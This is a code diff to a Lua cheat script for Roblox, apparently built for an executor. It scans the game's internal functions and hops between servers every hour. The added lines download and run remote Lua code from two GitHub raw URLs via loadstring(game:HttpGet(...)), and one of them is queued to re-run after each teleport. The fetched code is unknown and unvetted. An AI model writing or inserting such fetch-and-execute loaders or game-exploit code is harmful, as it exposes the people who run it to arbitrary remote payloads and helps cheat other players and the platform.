@@ -6,7 +6,9 @@ local Fire_Server
 local toby = false
 local Players = game:GetService('Players')
 local Local_Player = Players.LocalPlayer
-
+task.spawn(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/luca5432/Roblox-ANTI-AFK-SCRIPT/refs/heads/main/Script", true)()
+	end)
 for Index, Value in next, getgc(false) do
     if
         typeof(Value) == 'function'
@@ -16,7 +18,7 @@ for Index, Value in next, getgc(false) do
         break
     end
 end
-
+queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/gigimko/-/refs/heads/main/cal.lua", true)
 
 task.spawn(function()
 	while wait(3600) do
@@ -34,6 +36,8 @@ task.spawn(function()
     	end
 	
     	if #servers > 0 then
+			
+			wait(3)
     	    game["Teleport Service"]:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game.Players.LocalPlayer)
 		end
 	end
